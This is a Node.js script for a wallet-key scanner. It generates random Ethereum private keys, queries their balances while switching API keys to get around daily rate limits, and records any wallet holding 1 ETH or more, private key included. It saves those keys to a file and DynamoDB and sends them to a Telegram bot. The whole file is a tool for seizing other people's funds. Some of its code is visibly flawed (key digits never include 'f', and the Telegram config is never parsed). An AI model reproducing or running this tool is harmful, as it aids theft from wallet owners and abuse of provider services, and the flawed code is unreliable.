var argv = require('minimist')(process.argv.slice(2));

// const path = require("path");
var request = require("request");
const Web3 = require("web3");
const fs = require('fs');
var { log, logSuccess, logError, logWaning } = require("./myStd");
const clc = require("cli-color")
const server = require("socket.io")
// var cors = require('cors')

var PORT = 3001
if (argv.p) {
    PORT = argv.p
}
logWaning("PORT:", PORT)
const io = server(PORT, {
    path: "/",
    serveClient: false,
    cors: { origin: '*', },
    // below are engine.IO options
    pingInterval: 10000,
    pingTimeout: 5000,
    cookie: false
});

const { DynamoDBClient, CreateTableCommand, DeleteTableCommand, PutItemCommand, ListTablesCommand } = require("@aws-sdk/client-dynamodb");

const client = new DynamoDBClient({ region: "ap-southeast-1" });


var RUN = false;
var DAILY_TIME_RUN = "0:0:0";
var DAILY_TIME_RUN_FILE = "DAILY_TIME_RUN.txt";
var socket = null;

var TIMEOUT_QUERY = 100;
var count_query = 0;

var API_KEYS = [];
var current_API_KEYS_index = 0;

const HOST = [
    "wss://little-palpable-wave.discover.quiknode.pro/",
];

var web3s;

var telegram = {}


function ioemit() {
    if (io) io.emit(arguments);
}

function socketemit() {
    if (socket) socket.emit(arguments);
}

async function random_wallet(web3) {
    let private_key = ""
    i = 0
    for (i = 0; i < 64; i++) {
        n = Math.floor(Math.random() * 0xf);
        if (n > 0xf) log("error: n > 0xf", n);
        private_key += n.toString(16);
    }
    let a = web3.eth.accounts.privateKeyToAccount(private_key);
    let { address, privateKey } = a;
    delete a;
    return { address, privateKey };
}

async function setDailyTimeRun(dailyTime = DAILY_TIME_RUN, file = DAILY_TIME_RUN_FILE) {
    DAILY_TIME_RUN = dailyTime;
    fs.writeFileSync(file, dailyTime, { encoding: "utf8", flag: "w", mode: 0o666 })
    logSuccess("set file " + file + " success: " + clc.yellow(dailyTime));
}

async function getDailyTimeRun(file = DAILY_TIME_RUN_FILE) {
    if (!fs.existsSync(file)) {
        await setDailyTimeRun()
        return DAILY_TIME_RUN;
    } else {
        DAILY_TIME_RUN = fs.readFileSync(file, 'utf8')
        logSuccess(clc.yellow.bgRed(` ${DAILY_TIME_RUN} `));
        return DAILY_TIME_RUN;
    }
}

function loadAPIKeys(pathToFile = 'quicknode.txt') {
    return new Promise((rs, rj) => {
        fs.readFile(pathToFile, 'utf8', (err, data) => {
            if (err) {
                logError(err);
                rj(err);
            } else {
                API_KEYS = data.split("\n").filter(v => v.trim() !== "").map(v => v.trim());
                rs(API_KEYS);
            }
        });
    })
}

async function initWeb3(index = 0) {
    current_API_KEYS_index = index;
    log("initWeb3", index, API_KEYS)
    web3s = HOST.map(link => {
        return new Web3(link + API_KEYS[index]);
    });
    web3s.keyIndex = index;
    return web3s;
}

async function loadGoodWallets(file = "walletsGoodjs.json") {
    let data = fs.readFileSync(file, { encoding: 'utf8', flag: 'r' });
    return data.split("\n").filter(line => line.trim() !== "").map(line => JSON.parse(line))
}

function discoveredGoodWallet(address, privateKey, balance, web3) {
    let chain = (new URL(web3._provider.url)).host.split(".")[0]
    let content = `{"address":"${address}", "privateKey": "${privateKey}", "chain": "${chain}", "balance": ${balance}}\n`;
    log("Good Wallets: ", content);

    // write to file
    fs.open('walletsGoodjs.json', "a+", (err, fd) => {
        if (err) logError(err);
        else {
            fs.appendFile(fd, content, (err) => {
                if (err)
                    logError("Error:", err);
            });
        }
        fs.close(fd, () => { logSuccess("walletsGoodjs Saved OK"); })
    });

    sendMessage(content)

    const params = {
        TableName: "goodwallets",
        Item: {
            address: { S: address },
            privateKey: { S: privateKey },
            balance: { N: balance },
            chain: { S: chain }
        },
    };
    // save to database
    client.send(new PutItemCommand(params)).then(resultG => {
        // log(resultG["$metadata"].httpStatusCode == 200);
    }).catch(err => {
        logError(err.message)
    });

    ioemit('goodWallets', {
        newGoodWallets: {
            address: address,
            privateKey: privateKey,
            balance: balance,
            chain: chain
        }
    })
}

function loadTelegram(file = "telegram.json") {
    telegram = fs.readFileSync(file, { encoding: 'utf8', flag: 'r' })
    return telegram;
}

function sendMessage(message) {

    let options = {
        method: 'POST',
        url: `https://api.telegram.org/bot${telegram.token}/sendMessage`,
        qs: { text: message, chat_id: telegram.chat_id },
    };

    request(options, function (error, response, body) {
        if (error) throw new Error(error);
        logError(error)
    });

}

async function checkBalance(web3, wallet) {
    count_query++
    return web3.eth.getBalance(wallet.address).then(balance => {
        let chain = (new URL(web3._provider.url)).host.split(".")[0]
        ioemit("count_query", {
            count_query: count_query,
            address: wallet.address,
            privateKey: wallet.privateKey,
            current_API_KEYS_index: current_API_KEYS_index,
            chain: chain,
            RUN: RUN,
        })

        if (balance >= 1e18) {
            discoveredGoodWallet(wallet.address, wallet.privateKey, balance, web3);
            return wallet;
        } else
            return null;
    })
}

async function checkBalanceInChains(wallet, chainIndex = 0) {
    // console.log(wallet.address, chainIndex)
    if (chainIndex < web3s.length) {
        return checkBalance(web3s[chainIndex], wallet).then(r => checkBalanceInChains(wallet, chainIndex + 1))
            .catch(err => {
                ioemit("count_query", { error: `get balance error: ${err.message} - ${API_KEYS[current_API_KEYS_index]}`, RUN: RUN });
                if (err.message === 'Returned error: daily request count exceeded, request rate limited') {
                    if (current_API_KEYS_index >= (API_KEYS.length - 1)) {
                        RUN = false;
                        throw new Error("daily_exceeded")
                        // when all keys exceeded, set time run again next day
                    } else {
                        initWeb3(current_API_KEYS_index + 1).then(r => checkBalanceInChains(wallet));
                    }
                    logError("API_KEYS exceeded: ", API_KEYS[current_API_KEYS_index]);
                }
                else if (err.message.includes('project ID does not have access to')) { return checkBalanceInChains(wallet, chainIndex + 1) }
                else {
                    logError("checkBalance error: ", err);
                    console.error(err)
                    throw err
                }
            })
    } else return null;
}

const scanWallets = () => {
    // console.log(count_query)
    if (!RUN) return;
    // create random wallet
    random_wallet(web3s[0])
        .then((wallet) => {
            // check balance in chains
            checkBalanceInChains(wallet).then(r => scanWallets())
        })
        .catch(err => {
            console.log(err)
            if (err.message === 'daily_exceeded') {
                logError("All API_KEYS daily exceeded")
                ioemit("count_query", { error: `All API_KEYS daily exceeded - ${current_API_KEYS_index}`, RUN: RUN });
            }
            else { scanWallets(); }
        })
}

// auto run at time
function timerRun() {
    // (new Web3(HOST[0] + API_KEYS[0])).eth
    //     .getBalance("0x189b9cbd4aff470af2c0102f365fc1823d857965").then(v => log(v))



    let timer = setInterval(() => {
        let now = new Date();
        let t = `${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`
        if (t === DAILY_TIME_RUN) {
            logSuccess("Start run scan: ", t)
            sendMessage("Start run scan: ", t)
            RUN = true;
            scanWallets();
        }
    }, 1000)
}

/*******/
/* init app */
loadTelegram()
loadAPIKeys()
    .then(keys => initWeb3())
    .then(web3s => getDailyTimeRun())
    .then(timerRun)

io.on('connection', async (_socket) => {
    socket = _socket;

    logSuccess(socket.id)
    socket.on("count_query", async (msg) => {
        switch (msg) {
            case 'run_now':
                RUN = true;
                logWaning("Start scan: ", (new Date()).toTimeString())
                scanWallets();
                break;
            case 'pause_now':
                RUN = false;
                logError("Stop scan: ", (new Date()).toTimeString())
                break;
            case "get":
                break;
        }
        socket.emit("count_query", {
            "RUN": RUN,
            "count_query": count_query,
        });
        // log("count_query", msg, RUN);
    });

    socket.on("DAILY_TIME_RUN", msg => {
        switch (msg.command) {
            case "set":
                setDailyTimeRun(msg.DAILY_TIME_RUN)
                socket.emit("DAILY_TIME_RUN", {
                    status: "SUCCESS", DAILY_TIME_RUN: DAILY_TIME_RUN, message: "set DAILY_TIME_RUN success"
                })
                log(msg)
                break;
            case "get":
                socket.emit("DAILY_TIME_RUN", { "DAILY_TIME_RUN": DAILY_TIME_RUN })
                break;
        }
    });

    socket.on("API_KEYS", (msg) => {
        if (msg.command)
            switch (msg.command) {
                case "get":
                    socket.emit("API_KEYS", { API_KEYS: API_KEYS, current_API_KEYS_index: current_API_KEYS_index });
                    break;
                case "set":
                    log(msg.API_KEYS);
                    API_KEYS = msg.API_KEYS;
                    initWeb3()
                    socket.emit("API_KEYS", { message: "SUCCESS" });
                    break;
            }
    })

    socket.on("goodWallets", (msg) => {
        loadGoodWallets().then(wallets => {
            socket.emit('goodWallets', { goodWallets: wallets })
        })
    });
});
